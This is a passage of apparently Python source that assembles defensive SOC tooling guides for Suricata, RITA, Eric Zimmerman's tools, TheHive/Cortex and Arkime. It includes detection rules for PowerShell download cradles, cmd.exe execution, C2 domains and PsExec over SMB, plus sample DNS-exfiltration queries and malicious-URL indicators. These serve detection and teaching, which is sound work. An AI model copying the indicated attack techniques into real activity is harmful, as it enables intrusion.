alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"CUSTOM PowerShell Download Cradle"; flow:established,to_server; http.user_agent; content:"WindowsPowerShell"; http.uri; content:".ps1"; sid:1000001; rev:1;)

# Example: Detect DNS query for known C2 domain
alert dns $HOME_NET any -> any any (msg:"CUSTOM Known C2 Domain"; dns.query; content:"evil-c2-domain.xyz"; nocase; sid:1000002; rev:1;)
```

### Key Rule Options

| Option | Purpose | Example |
|---|---|---|
| content | Byte/string match | content:"malware"; |
| pcre | Regex match | pcre:"/cmd\.exe.*\/c/i"; |
| flow | Connection direction | flow:established,to_server; |
| threshold | Rate-based alerting | threshold:type both,track by_src,count 10,seconds 60; |
| http.uri | Match HTTP URI | http.uri; content:"/login.php"; |
| http.user_agent | Match User-Agent | http.user_agent; content:"Bot"; |
| tls.sni | Match TLS SNI | tls.sni; content:"evil.com"; |
| dns.query | Match DNS query | dns.query; content:"malware.xyz"; |
| ja3.hash | Match JA3 fingerprint | ja3.hash; content:"abc123..."; |
| filemagic | Match file type | filemagic:"executable"; |

## Alert Tuning

### Suppressing False Positives

```yaml
# /etc/suricata/threshold.config

# Suppress a specific SID from a specific source
suppress gen_id 1, sig_id 2100498, track by_src, ip 10.0.0.50

# Rate-limit noisy rules
rate_filter gen_id 1, sig_id 2210044, track by_src, count 5, seconds 60, new_action drop, timeout 300

# Threshold to reduce alert volume
threshold gen_id 1, sig_id 2013504, type limit, track by_src, count 1, seconds 3600
```

### Disabling Rules

```bash
# Create a disable list
echo "2100498" >> /etc/suricata/disable.conf
echo "group:emerging-policy.rules" >> /etc/suricata/disable.conf

# Use suricata-update with disable config
sudo suricata-update --disable-conf /etc/suricata/disable.conf
```

## Real Investigation Example

### Scenario: Detecting C2 via JA3 Fingerprinting

```bash
# Step 1: Extract JA3 hashes from EVE logs
cat eve.json | jq -r 'select(.event_type=="tls") | .tls.ja3.hash' | \
  sort | uniq -c | sort -rn | head -20

# Step 2: Cross-reference with known malicious JA3 hashes
# https://ja3er.com/search/
cat eve.json | jq -r 'select(.event_type=="tls" and .tls.ja3.hash=="<malicious_hash>") |
  [.timestamp, .src_ip, .dest_ip, .tls.sni] | @csv'

# Step 3: Write a Suricata rule for that JA3
# alert tls $HOME_NET any -> $EXTERNAL_NET any (msg:"CUSTOM Malicious JA3"; ja3.hash; content:"<hash>"; sid:1000010; rev:1;)
```

### Scenario: Hunting Lateral Movement via SMB

```bash
# Rule to detect PsExec-like SMB activity
alert smb $HOME_NET any -> $HOME_NET any (msg:"CUSTOM Potential PsExec over SMB"; flow:established,to_server; smb.named_pipe; content:"svcctl"; sid:1000020; rev:1;)

# Query EVE logs for SMB alerts
cat eve.json | jq 'select(.event_type=="smb") | {ts: .timestamp, src: .src_ip, dst: .dest_ip, command: .smb.command, filename: .smb.filename}'
```

## Integration with SOC Workflow

### Filebeat to Elasticsearch

```yaml
# filebeat.yml
filebeat.inputs:
  - type: log
    paths:
      - /var/log/suricata/eve.json
    json.keys_under_root: true
    json.add_error_key: true

output.elasticsearch:
  hosts: ["http://127.0.0.1:9200"]
  index: "suricata-%{+yyyy.MM.dd}"
```

### Suricata Socket Control

```bash
# Reload rules without restart
sudo suricatasc -c reload-rules

# Check running stats
sudo suricatasc -c dump-counters

# Get uptime
sudo suricatasc -c uptime
```

## Best Practices

1. **Set HOME_NET correctly** - this is the most critical configuration item
2. **Use suricata-update** for rule management instead of manually editing rule files
3. **Enable EVE JSON logging** for structured SIEM-ready output
4. **Tune aggressively** - disable rules that generate noise in your environment
5. **Monitor Suricata stats** via the stats.log or EVE stats events
6. **Use AF_PACKET** mode on Linux for best capture performance
7. **Separate IDS from IPS** - run in IDS mode until you trust your rule tuning

## Further Reading

- Suricata documentation: https://docs.suricata.io/
- Emerging Threats rules: https://rules.emergingthreats.net/
- Suricata rule writing: https://docs.suricata.io/en/latest/rules/
"""
    ))

    # -------------------------------------------------------------------------
    # 8. RITA Beacon Detection and Network Threat Hunting
    # -------------------------------------------------------------------------
    articles.append((
        "RITA Beacon Detection and Network Threat Hunting",
        ["tooling", "rita", "beacon-detection", "network", "threat-hunting", "c2"],
        r"""# RITA Beacon Detection and Network Threat Hunting

## Overview

RITA (Real Intelligence Threat Analytics) is an open-source framework developed
by Active Countermeasures for detecting command-and-control (C2) beaconing and
other network threat indicators in Zeek log data. RITA uses statistical analysis
to identify connections that exhibit periodic communication patterns, DNS tunneling,
and long-standing connections that evade traditional signature-based detection.

## Why It Matters

| Capability | SOC Benefit |
|---|---|
| Beacon detection | Finds C2 by timing analysis, not signatures |
| DNS tunneling detection | Identifies data exfil via DNS |
| Long connection analysis | Flags persistent C2 channels |
| Threat scoring | Ranks results by likelihood of malice |
| Zeek integration | Works with existing Zeek deployments |

**MITRE ATT&CK Relevance:** RITA directly addresses T1071 (Application Layer
Protocol), T1573 (Encrypted Channel), T1041 (Exfiltration Over C2 Channel),
T1568 (Dynamic Resolution), T1572 (Protocol Tunneling), T1571 (Non-Standard Port).

## Installation

### Prerequisites

```bash
# Install MongoDB (RITA v4 requirement)
wget -qO - https://www.mongodb.org/static/pgp/server-6.0.asc | sudo apt-key add -
echo "deb [ arch=amd64 ] https://repo.mongodb.org/apt/ubuntu jammy/mongodb-org/6.0 multiverse" | \
  sudo tee /etc/apt/sources.list.d/mongodb-org-6.0.list
sudo apt update && sudo apt install -y mongodb-org
sudo systemctl start mongod && sudo systemctl enable mongod
```

### Install RITA

```bash
# Download and install
wget https://github.com/activecm/rita/releases/latest/download/rita-linux-amd64.tar.gz
tar xzf rita-linux-amd64.tar.gz
sudo mv rita /usr/local/bin/
sudo mkdir -p /etc/rita
sudo cp rita.yaml /etc/rita/config.yaml

# Verify installation
rita --version
```

### Configuration

```yaml
# /etc/rita/config.yaml
MongoDB:
  ConnectionString: mongodb://localhost:27017
  AuthenticationMechanism: ""
  SocketTimeout: 2
  TLS:
    Enable: false

LogConfig:
  LogLevel: 2
  LogPath: /var/log/rita/rita.log

Filtering:
  AlwaysInclude:
    - 0.0.0.0/0       # Include everything by default
  NeverInclude:
    - 10.0.0.1/32      # Exclude your DNS server
    - 10.0.0.2/32      # Exclude your gateway
  InternalSubnets:
    - 10.0.0.0/8
    - 172.16.0.0/12
    - 192.168.0.0/16

Beacon:
  DefaultConnectionThresh: 20  # Minimum connections to analyze
```

## Core Usage

### Importing Zeek Logs

```bash
# Import a single day of Zeek logs
rita import /opt/zeek/logs/2025-03-15/ --database day-2025-03-15

# Import with rolling database (appends data)
rita import /opt/zeek/logs/current/ --database rolling --rolling

# Import multiple days
for dir in /opt/zeek/logs/2025-03-1*; do
  date=$(basename "$dir")
  rita import "$dir" --database "dataset-$date"
done

# List databases
rita list
```

### Analyzing Results

```bash
# Show beacon analysis (the primary use case)
rita show-beacons day-2025-03-15

# Output:
# Score | Source          | Destination      | Connections | Avg Bytes | Intvl Range | Intvl Mode | ...
# 0.981 | 10.1.2.50      | 203.0.113.100    | 8640        | 256       | 10          | 10         | ...
# 0.856 | 10.1.2.75      | 198.51.100.50    | 1440        | 1024      | 60          | 60         | ...

# Show long connections
rita show-long-connections day-2025-03-15

# Show DNS analysis (tunneling indicators)
rita show-exploded-dns day-2025-03-15

# Show strobes (high-frequency connections)
rita show-strobes day-2025-03-15

# Show blacklisted connections (if threat intel configured)
rita show-bl-hostnames day-2025-03-15
rita show-bl-source-ips day-2025-03-15
```

### HTML Report Generation

```bash
# Generate a full HTML report
rita html-report day-2025-03-15

# Report is saved to the current directory
# Open in browser:
firefox day-2025-03-15/index.html
```

## Understanding Beacon Scores

| Score Range | Interpretation | Action |
|---|---|---|
| 0.90 - 1.00 | Very likely beaconing | Investigate immediately |
| 0.75 - 0.89 | Probable beaconing | Investigate within shift |
| 0.50 - 0.74 | Possible beaconing | Review when time permits |
| 0.00 - 0.49 | Likely benign | Periodic software updates, NTP, etc. |

### Beacon Score Components

```
RITA scores beacons based on:

1. Timestamp Score (TS): Regularity of connection intervals
   - Perfect beacon: connections exactly every N seconds
   - TS approaching 1.0 = highly regular

2. Data Size Score (DS): Consistency of transferred bytes
   - C2 often sends/receives same-size packets
   - DS approaching 1.0 = very consistent sizes

3. Duration Score: How long the communication persists
   - Longer persistence = higher concern

4. Connection Count: Total number of connections
   - More connections = more statistical confidence

Final Score = weighted combination of all factors
```

## Real Investigation Example

### Scenario: Identifying Cobalt Strike Beacon

```bash
# Step 1: Import last 7 days of Zeek logs
for i in $(seq 0 6); do
  date=$(date -d "$i days ago" +%Y-%m-%d)
  rita import "/opt/zeek/logs/$date/" --database "week-hunt"
done

# Step 2: Check for high-scoring beacons
rita show-beacons week-hunt | head -20

# Example output showing a Cobalt Strike beacon:
# 0.967 | 10.1.2.50 | 185.141.25.168 | 12096 | 68 | 5 | 60 | 60

# Step 3: Investigate the destination
rita show-beacons week-hunt -H | grep "185.141.25.168"

# Step 4: Check DNS resolution for that IP
rita show-exploded-dns week-hunt | grep "185.141.25.168"

# Step 5: Cross-reference in Zeek logs
cat /opt/zeek/logs/*/conn.log | zeek-cut id.orig_h id.resp_h id.resp_p duration | \
  grep "185.141.25.168"

# Step 6: Get connection details for the beacon
cat /opt/zeek/logs/*/ssl.log | zeek-cut server_name subject issuer | \
  grep "185.141.25.168"
```

### Scenario: DNS Tunneling Detection

```bash
# Step 1: Show exploded DNS results
rita show-exploded-dns week-hunt

# Look for domains with:
# - High subdomain count (>100 unique subdomains)
# - Long subdomain names (>40 characters)
# - High query volume

# Example output:
# Subdomains | Times Looked Up | Domain
# 5847       | 5847            | tunnel.evil-domain.xyz

# Step 2: Investigate in Zeek DNS logs
cat /opt/zeek/logs/*/dns.log | zeek-cut query | grep "evil-domain.xyz" | head -5
# aGVsbG8gd29ybGQgdGhpcyBpcyBhIHRlc3Q.tunnel.evil-domain.xyz
# dGhpcyBkYXRhIGlzIGJlaW5nIGV4ZmlsdHJhdGVk.tunnel.evil-domain.xyz
# (base64-encoded data in subdomains = DNS exfiltration)
```

## Integration with SOC Workflow

### Automated Daily Analysis

```bash
#!/bin/bash
# /opt/scripts/daily_rita.sh (run via cron at 06:00)
DATE=$(date -d "yesterday" +%Y-%m-%d)
DB="daily-${DATE}"

# Import yesterday's logs
rita import "/opt/zeek/logs/${DATE}/" --database "$DB"

# Generate HTML report
rita html-report "$DB" -o "/var/www/rita-reports/${DB}/"

# Extract high-scoring beacons and send alert
rita show-beacons "$DB" | awk -F'|' '$1 > 0.8' > /tmp/high_beacons.txt

if [ -s /tmp/high_beacons.txt ]; then
  mail -s "RITA: High-scoring beacons detected ${DATE}" soc-team@company.com < /tmp/high_beacons.txt
fi
```

### Export to SIEM

```bash
# Export beacon results as JSON
rita show-beacons day-2025-03-15 --json | \
  jq -c '.[] | . + {"alert_type": "beacon", "tool": "rita"}' | \
  while read -r line; do
    curl -s -X POST "http://127.0.0.1:9200/rita-beacons/_doc" \
      -H "Content-Type: application/json" -d "$line"
  done
```

## Best Practices

1. **Import at least 24 hours of data** for meaningful beacon detection
2. **Exclude known-good endpoints** (DNS servers, NTP, update servers) in config
3. **Run weekly rolling imports** for long-term beacon analysis
4. **Combine with threat intel** - configure blacklist feeds in RITA
5. **Validate findings** by examining the actual Zeek conn.log entries
6. **Tune the connection threshold** based on your network size
7. **Generate daily HTML reports** and review during morning shift handoff

## Further Reading

- RITA GitHub: https://github.com/activecm/rita
- Active Countermeasures blog: https://www.activecountermeasures.com/blog/
- Beacon detection methodology: https://www.activecountermeasures.com/identifying-beacons/
"""
    ))

    # -------------------------------------------------------------------------
    # 9. Eric Zimmerman Tools for Windows Forensics
    # -------------------------------------------------------------------------
    articles.append((
        "Eric Zimmerman Tools for Windows Forensics",
        ["tooling", "eric-zimmerman", "ez-tools", "windows", "forensics", "dfir", "registry"],
        r"""# Eric Zimmerman Tools for Windows Forensics

## Overview

Eric Zimmerman's tools (commonly called "EZ Tools") are a comprehensive suite of
open-source command-line utilities for Windows forensic analysis. Each tool focuses
on parsing specific Windows artifacts - registry hives, event logs, prefetch files,
MFT, LNK files, jump lists, and more. They are the gold standard for Windows DFIR
artifact parsing.

## Why It Matters

| Capability | SOC Benefit |
|---|---|
| Artifact-specific parsers | Deep, accurate parsing of Windows artifacts |
| CSV output | Easy to analyze in Timeline Explorer or Excel |
| Batch processing | Process entire evidence sets quickly |
| Frequently updated | Keeps pace with new Windows versions |
| Free and open-source | No licensing barriers for SOC teams |

**MITRE ATT&CK Relevance:** EZ Tools help investigate virtually every technique
that leaves traces on Windows: T1547 (Boot/Logon Autostart), T1053 (Scheduled Tasks),
T1003 (Credential Dumping artifacts), T1070 (Indicator Removal), T1059 (Command
Execution artifacts).

## Installation

```powershell
# Download all tools at once using the downloader
Invoke-WebRequest -Uri "https://f001.backblazeb2.com/file/EricZimmermanTools/Get-ZimmermanTools.zip" `
  -OutFile Get-ZimmermanTools.zip
Expand-Archive Get-ZimmermanTools.zip -DestinationPath C:\Tools\EZTools
cd C:\Tools\EZTools

# Run the downloader to fetch all tools
.\Get-ZimmermanTools.ps1 -Dest C:\Tools\EZTools

# Or download individually from:
# https://ericzimmerman.github.io/#!index.md
```

### Tool Inventory

| Tool | Artifact | Description |
|---|---|---|
| MFTECmd | $MFT, $J, $Boot | Master File Table parser |
| EvtxECmd | .evtx files | Windows Event Log parser |
| PECmd | Prefetch (.pf) | Prefetch file parser |
| RECmd | Registry hives | Registry explorer CLI |
| AmcacheParser | Amcache.hve | Application execution evidence |
| AppCompatCacheParser | SYSTEM hive | ShimCache parser |
| ShellBagsExplorer | NTUSER/UsrClass | Folder access evidence |
| LECmd | .lnk files | Shortcut file parser |
| JLECmd | Jump Lists | Recent/frequent file access |
| SrumECmd | SRUDB.dat | System Resource Usage Monitor |
| SumECmd | .mdb files | User Access Logging |
| WxTCmd | ActivitiesCache.db | Windows Timeline parser |
| RBCmd | $I files | Recycle Bin parser |
| bstrings | Binary files | String extraction with regex |
| TimelineExplorer | CSV files | Visual CSV analysis tool |

## Core Usage

### MFTECmd - File System Timeline

```powershell
# Parse the MFT for a complete file system timeline
MFTECmd.exe -f "E:\Evidence\$MFT" --csv C:\Output --csvf mft_output.csv

# Parse the USN Journal ($J) for recent file changes
MFTECmd.exe -f "E:\Evidence\$J" --csv C:\Output --csvf usn_journal.csv

# Key fields in output:
# ParentPath, FileName, Extension, FileSize, Created, Modified, Accessed,
# IsDirectory, InUse (deleted files show InUse=false)
```

### EvtxECmd - Event Log Parsing

```powershell
# Parse a single event log
EvtxECmd.exe -f "E:\Evidence\Security.evtx" --csv C:\Output --csvf security.csv

# Parse all event logs in a directory
EvtxECmd.exe -d "E:\Evidence\Logs\" --csv C:\Output --csvf all_events.csv

# Parse with custom map for enriched output
EvtxECmd.exe -d "E:\Evidence\Logs\" --csv C:\Output --csvf events.csv --maps C:\Tools\EZTools\EvtxECmd\Maps

# Filter by date range
EvtxECmd.exe -f "E:\Evidence\Security.evtx" --csv C:\Output --csvf security.csv ^
  --sd "2025-03-15 00:00:00" --ed "2025-03-16 00:00:00"
```

### PECmd - Prefetch Analysis

```powershell
# Parse all prefetch files (shows program execution history)
PECmd.exe -d "E:\Evidence\Prefetch\" --csv C:\Output --csvf prefetch.csv

# Parse a single prefetch file
PECmd.exe -f "E:\Evidence\Prefetch\CMD.EXE-4A81B364.pf"

# Key output: executable name, run count, last 8 run times, files/directories referenced
```

### RECmd - Registry Analysis

```powershell
# Run all batch files against a registry hive
RECmd.exe --bn C:\Tools\EZTools\RECmd\BatchExamples\AllRegExecutablesFoundOrRun.reb ^
  -f "E:\Evidence\NTUSER.DAT" --csv C:\Output --csvf user_reg.csv

# Run against SYSTEM hive for services and startup
RECmd.exe --bn C:\Tools\EZTools\RECmd\BatchExamples\AllRegExecutablesFoundOrRun.reb ^
  -f "E:\Evidence\SYSTEM" --csv C:\Output --csvf system_reg.csv

# Run against SOFTWARE hive
RECmd.exe --bn C:\Tools\EZTools\RECmd\BatchExamples\AllRegExecutablesFoundOrRun.reb ^
  -f "E:\Evidence\SOFTWARE" --csv C:\Output --csvf software_reg.csv
```

### AmcacheParser - Application Execution

```powershell
# Parse Amcache for evidence of program execution
AmcacheParser.exe -f "E:\Evidence\Amcache.hve" --csv C:\Output --csvf amcache.csv

# Output includes: SHA1 hash, full path, file size, compile time, install date
# Especially useful for identifying when malware was first executed
```

### AppCompatCacheParser - ShimCache

```powershell
# Parse ShimCache from SYSTEM hive
AppCompatCacheParser.exe -f "E:\Evidence\SYSTEM" --csv C:\Output --csvf shimcache.csv

# ShimCache records programs that were executed or present on disk
# Ordered by most recent last - order matters for timeline
```

### LECmd and JLECmd - File Access Evidence

```powershell
# Parse LNK files (shortcut files show file access)
LECmd.exe -d "E:\Evidence\Recent\" --csv C:\Output --csvf lnk_files.csv

# Parse Jump Lists (pinned and recent items)
JLECmd.exe -d "E:\Evidence\AutomaticDestinations\" --csv C:\Output --csvf jumplists.csv
```

### SrumECmd - Resource Usage

```powershell
# Parse SRUM database (network usage, app usage per user)
SrumECmd.exe -f "E:\Evidence\SRUDB.dat" -r "E:\Evidence\SOFTWARE" ^
  --csv C:\Output --csvf srum.csv

# SRUM tracks: bytes sent/received per app, app execution duration, network connectivity
```

## Real Investigation Example

### Scenario: Malware Execution Timeline

```powershell
# Step 1: Check Prefetch for suspicious executables
PECmd.exe -d "E:\Evidence\Prefetch\" --csv C:\Output --csvf prefetch.csv
# Look for: unknown executables, tools like psexec, wmic, powershell unusual times

# Step 2: Cross-reference with Amcache for SHA1 hashes
AmcacheParser.exe -f "E:\Evidence\Amcache.hve" --csv C:\Output --csvf amcache.csv
# Get SHA1 hash and check against VirusTotal

# Step 3: Check ShimCache for execution order
AppCompatCacheParser.exe -f "E:\Evidence\SYSTEM" --csv C:\Output --csvf shimcache.csv
# Establish order of program execution

# Step 4: Check registry for persistence
RECmd.exe --bn AllRegExecutablesFoundOrRun.reb -f "E:\Evidence\NTUSER.DAT" ^
  --csv C:\Output --csvf persistence.csv
# Look for new Run keys, services, scheduled tasks

# Step 5: Build MFT timeline around the incident
MFTECmd.exe -f "E:\Evidence\$MFT" --csv C:\Output --csvf mft.csv
# Filter by timestamp range of interest in Timeline Explorer
```

## Timeline Explorer

```
Timeline Explorer is the companion GUI tool for analyzing CSV output:

1. Open TimelineExplorer.exe
2. Load any CSV from EZ Tools
3. Features:
   - Column filtering and sorting
   - Regex search across all columns
   - Conditional formatting (highlight rows by criteria)
   - Multi-file loading (combine different artifact CSVs)
   - Export filtered results
   - Time zone conversion
```

## Integration with SOC Workflow

### Batch Processing Script

```powershell
# process_evidence.ps1 - Run all EZ Tools against collected evidence
param([string]$EvidenceDir, [string]$OutputDir)
$EZPath = "C:\Tools\EZTools"

# Parse all artifacts
& "$EZPath\MFTECmd.exe" -f "$EvidenceDir\`$MFT" --csv $OutputDir --csvf mft.csv
& "$EZPath\EvtxECmd.exe" -d "$EvidenceDir\Logs\" --csv $OutputDir --csvf events.csv
& "$EZPath\PECmd.exe" -d "$EvidenceDir\Prefetch\" --csv $OutputDir --csvf prefetch.csv
& "$EZPath\AmcacheParser.exe" -f "$EvidenceDir\Amcache.hve" --csv $OutputDir --csvf amcache.csv
& "$EZPath\AppCompatCacheParser.exe" -f "$EvidenceDir\SYSTEM" --csv $OutputDir --csvf shimcache.csv
& "$EZPath\LECmd.exe" -d "$EvidenceDir\Recent\" --csv $OutputDir --csvf lnk.csv
& "$EZPath\JLECmd.exe" -d "$EvidenceDir\AutoDest\" --csv $OutputDir --csvf jumplists.csv

Write-Host "[+] Processing complete. Open CSVs in Timeline Explorer." -ForegroundColor Green
```

## Best Practices

1. **Process artifacts in order**: Prefetch -> Amcache -> ShimCache -> Registry -> MFT
2. **Use Timeline Explorer** for visual analysis instead of raw CSV
3. **Combine KAPE collection with EZ Tools processing** (KAPE modules automate this)
4. **Update tools regularly** with Get-ZimmermanTools.ps1
5. **Learn the EvtxECmd maps** - they provide enriched event log parsing
6. **Document your findings** with timestamps for the incident timeline

## Further Reading

- Eric Zimmerman's tools: https://ericzimmerman.github.io/
- SANS Windows Forensic Analysis poster: https://www.sans.org/posters/windows-forensic-analysis/
- Tool documentation: https://github.com/EricZimmerman
"""
    ))

    # -------------------------------------------------------------------------
    # 10. TheHive and Cortex for Incident Management
    # -------------------------------------------------------------------------
    articles.append((
        "TheHive and Cortex for Incident Management",
        ["tooling", "thehive", "cortex", "incident-response", "case-management", "soar"],
        r"""# TheHive and Cortex for Incident Management

## Overview

TheHive is an open-source Security Incident Response Platform (SIRP) designed for
SOC teams to manage security incidents collaboratively. Cortex is its companion
analysis engine that automates observable analysis through analyzers (e.g., VirusTotal
lookups, domain reputation checks) and responders (e.g., block IP, disable account).
Together they form a powerful case management and automation platform.

## Why It Matters

| Capability | SOC Benefit |
|---|---|
| Case management | Structured incident tracking and collaboration |
| Observable enrichment | Automated IOC analysis via 100+ analyzers |
| Playbook support | Standardized response procedures |
| MISP integration | Bidirectional threat intel sharing |
| Alert intake | Ingest alerts from SIEM, IDS, email |
| Metrics and reporting | Track MTTD, MTTR, and analyst workload |

**MITRE ATT&CK Relevance:** TheHive supports the full incident response lifecycle,
helping document and track all ATT&CK techniques observed during an investigation.

## Installation

### Docker Compose Deployment

```yaml
# docker-compose.yml
version: "3"
services:
  thehive:
    image: strangebee/thehive:5.2
    ports:
      - "9000:9000"
    environment:
      - JVM_OPTS=-Xms1024m -Xmx1024m
    volumes:
      - thehive-data:/opt/thp/thehive/db
      - thehive-index:/opt/thp/thehive/index
      - thehive-files:/opt/thp/thehive/files
    depends_on:
      - elasticsearch
      - cassandra

  cortex:
    image: thehiveproject/cortex:3.1.7
    ports:
      - "9001:9001"
    volumes:
      - cortex-jobs:/opt/cortex/jobs

  elasticsearch:
    image: docker.elastic.co/elasticsearch/elasticsearch:7.17.12
    environment:
      - discovery.type=single-node
      - xpack.security.enabled=false
      - "ES_JAVA_OPTS=-Xms512m -Xmx512m"
    volumes:
      - es-data:/usr/share/elasticsearch/data

  cassandra:
    image: cassandra:4.1
    volumes:
      - cassandra-data:/var/lib/cassandra

volumes:
  thehive-data:
  thehive-index:
  thehive-files:
  cortex-jobs:
  es-data:
  cassandra-data:
```

```bash
docker compose up -d

# Default login:
# TheHive: http://localhost:9000 - admin@thehive.local / secret
# Cortex: http://localhost:9001 - (create admin on first access)
```

## Core Usage

### Creating Cases

```
TheHive Web UI:
1. Click "New Case"
2. Fill in:
   - Title: "Phishing Campaign Targeting Finance"
   - Severity: Medium
   - TLP: AMBER
   - PAP: AMBER
   - Tags: phishing, finance, Q1-2025
   - Description: Markdown-formatted incident description
3. Assign to analyst
4. Add tasks (triage, containment, eradication, recovery)
```

### TheHive API Usage

```bash
# Create a case via API
curl -X POST "http://localhost:9000/api/v1/case" \
  -H "Authorization: Bearer YOUR_API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "title": "Suspicious PowerShell Activity on WS-042",
    "description": "Alert from SIEM: encoded PowerShell execution detected",
    "severity": 3,
    "tlp": 2,
    "pap": 2,
    "tags": ["powershell", "endpoint", "t1059.001"]
  }'

# Add an observable to a case
curl -X POST "http://localhost:9000/api/v1/case/{caseId}/observable" \
  -H "Authorization: Bearer YOUR_API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "dataType": "ip",
    "data": "203.0.113.50",
    "message": "C2 server IP from beacon analysis",
    "tlp": 2,
    "ioc": true,
    "tags": ["c2", "cobalt-strike"]
  }'

# Add a task to a case
curl -X POST "http://localhost:9000/api/v1/case/{caseId}/task" \
  -H "Authorization: Bearer YOUR_API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "title": "Isolate affected endpoint",
    "group": "Containment",
    "description": "Network isolate WS-042 via EDR console"
  }'
```

### Observable Types

| Type | Example | Common Analyzers |
|---|---|---|
| ip | 203.0.113.50 | AbuseIPDB, VirusTotal, Shodan |
| domain | evil-domain.xyz | VirusTotal, URLhaus, DNSDB |
| url | http://evil.com/payload | VirusTotal, URLscan, PhishTank |
| hash | d41d8cd98f00b204e98... | VirusTotal, MalwareBazaar, MISP |
| mail | attacker@evil.com | Emailrep, HaveIBeenPwned |
| filename | payload.exe | MISP lookup |
| fqdn | c2.evil-domain.xyz | PassiveTotal, SecurityTrails |

## Cortex Configuration

### Enabling Analyzers

```
Cortex Web UI (http://localhost:9001):
1. Go to Organization > Analyzers
2. Enable desired analyzers:
   - VirusTotal_GetReport (requires API key)
   - AbuseIPDB (requires API key)
   - URLhaus
   - Shodan_Host (requires API key)
   - MISP_2_1 (requires MISP URL and key)
   - FileInfo (local file analysis)
   - Yara (requires rule repository path)
3. Configure API keys for each analyzer
4. Set rate limits to avoid API quota exhaustion
```

### Running Analysis

```bash
# Analyze an observable via Cortex API
curl -X POST "http://localhost:9001/api/analyzer/VirusTotal_GetReport_3_1/run" \
  -H "Authorization: Bearer CORTEX_API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "data": "203.0.113.50",
    "dataType": "ip",
    "tlp": 2,
    "pap": 2
  }'
```

### Configuring Responders

```
Responders automate actions:
- Mailer: Send notification emails
- MISP: Export observables to MISP
- Velociraptor: Trigger endpoint collection
- Wazuh: Apply active response rules
- DNS Sinkhole: Add domain to sinkhole
```

## Real Investigation Example

### Scenario: Phishing Incident Workflow

```
1. ALERT INTAKE
   - SIEM forwards phishing alert to TheHive via API
   - Alert contains: sender email, subject, URL, attachment hash

2. CASE CREATION
   - Analyst promotes alert to case
   - Adds observables: sender IP, URL, attachment hash, sender domain

3. AUTOMATED ENRICHMENT (Cortex)
   - VirusTotal: Hash is 15/72 detections (Trojan.GenericKD)
   - URLhaus: URL is known malware distribution
   - AbuseIPDB: Sender IP has 95% confidence score

4. INVESTIGATION TASKS
   - Task 1: Identify all recipients (search email gateway logs)
   - Task 2: Check if anyone clicked the link (proxy logs)
   - Task 3: Check if payload executed (EDR/Velociraptor)

5. CONTAINMENT
   - Block sender domain at email gateway
   - Block URL at proxy
   - Isolate any infected endpoints

6. CASE CLOSURE
   - Document findings in case
   - Export IOCs to MISP
   - Generate case report
   - Update playbook with lessons learned
```

## Integration with SOC Workflow

### SIEM Alert Forwarding

```python
# forward_alerts.py - Forward Elasticsearch alerts to TheHive
import requests

THEHIVE_URL = "http://localhost:9000"
API_KEY = "YOUR_API_KEY"

def create_alert(title, description, source, source_ref, artifacts):
    alert = {
        "title": title,
        "description": description,
        "type": "external",
        "source": source,
        "sourceRef": source_ref,
        "severity": 2,
        "tlp": 2,
        "artifacts": artifacts
    }
    resp = requests.post(
        f"{THEHIVE_URL}/api/v1/alert",
        headers={"Authorization": f"Bearer {API_KEY}"},
        json=alert
    )
    return resp.json()
```

### MISP Integration

```
TheHive <-> MISP bidirectional sync:
1. Export case observables to MISP as events
2. Import MISP events as TheHive alerts
3. Enrich observables with MISP threat intel via Cortex

Configuration in TheHive application.conf:
  misp {
    interval = 5 minutes
    servers = [{
      name = "MISP Production"
      url = "https://misp.company.com"
      auth { type = "key"; key = "MISP_API_KEY" }
      purpose = "ImportAndExport"
    }]
  }
```

## Best Practices

1. **Define case templates** for common incident types (phishing, malware, BEC)
2. **Use TLP and PAP markings** consistently for information sharing control
3. **Automate alert intake** from your SIEM to reduce manual work
4. **Configure Cortex analyzers** for your most common observable types
5. **Track metrics**: cases per week, MTTR, analyst workload, closure rates
6. **Integrate with MISP** for threat intelligence sharing
7. **Build custom responders** for your environment-specific containment actions

## Further Reading

- TheHive documentation: https://docs.strangebee.com/
- Cortex documentation: https://docs.strangebee.com/cortex/
- TheHive4py (Python library): https://github.com/TheHive-Project/TheHive4py
"""
    ))

    # -------------------------------------------------------------------------
    # 11. Arkime (Moloch) Full Packet Capture and Analysis
    # -------------------------------------------------------------------------
    articles.append((
        "Arkime (Moloch) Full Packet Capture and Analysis",
        ["tooling", "arkime", "moloch", "pcap", "packet-capture", "network", "nta"],
        r"""# Arkime (Moloch) Full Packet Capture and Analysis

## Overview

Arkime (formerly Moloch) is an open-source full packet capture (FPC) and indexing
system. It stores every packet traversing your network and provides a web interface
for searching, browsing, and exporting captured traffic. Unlike flow-based tools,
Arkime retains full payload data, enabling deep-dive analysis of any past connection.

## Why It Matters

| Capability | SOC Benefit |
|---|---|
| Full packet capture | Complete record of all network traffic |
| Session indexing | Fast search across terabytes of PCAP data |
| Web-based viewer | Browse sessions and decode protocols in browser |
| PCAP export | Extract specific sessions for Wireshark analysis |
| API access | Programmatic queries for automation |
| Multi-node | Scale capture across multiple network taps |

**MITRE ATT&CK Relevance:** Arkime provides evidence for T1071 (Application Layer
Protocol), T1041 (Exfiltration Over C2), T1105 (Ingress Tool Transfer), T1570
(Lateral Tool Transfer), T1048 (Exfiltration Over Alternative Protocol).

## Installation

### Ubuntu/Debian

```bash
# Install Elasticsearch first (Arkime requires it)
# Then install Arkime
wget https://github.com/arkime/arkime/releases/download/v5.0.0/arkime_5.0.0-1.ubuntu2204_amd64.deb
sudo dpkg -i arkime_5.0.0-1.ubuntu2204_amd64.deb

# Run configuration script
sudo /opt/arkime/bin/Configure

# Configuration prompts:
# - Interface to capture: eth0
# - Elasticsearch URL: http://127.0.0.1:9200
# - Password for admin user

# Initialize Elasticsearch indices
sudo /opt/arkime/db/db.pl http://127.0.0.1:9200 init

# Add admin user
sudo /opt/arkime/bin/arkime_add_user.sh admin "Admin User" ADMIN_PASSWORD --admin

# Start capture and viewer
sudo systemctl start arkimecapture
sudo systemctl start arkimeviewer
```

### Docker Deployment

```yaml
version: "3"
services:
  arkime:
    image: arkime/arkime:latest
    network_mode: host
    cap_add:
      - NET_ADMIN
      - NET_RAW
    volumes:
      - ./config:/opt/arkime/etc
      - ./pcap:/opt/arkime/raw
      - ./logs:/opt/arkime/logs
    environment:
